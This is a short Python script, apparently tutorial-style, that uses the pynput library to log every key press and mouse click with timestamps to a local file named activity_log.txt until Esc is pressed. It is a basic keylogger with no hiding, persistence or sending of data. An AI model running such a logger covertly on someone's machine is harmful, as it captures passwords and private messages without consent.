from pynput import keyboard, mouse
import logging

logging.basicConfig(filename=("activity_log.txt"), level=logging.INFO, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(f"Key pressed: {key}")

def on_click(x, y, button, pressed):
    if pressed:
        logging.info(f"Mouse clicked at: ({x}, {y}) with {button}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as k_listener, \
     mouse.Listener(on_click=on_click) as m_listener:
    k_listener.join()
    m_listener.join()
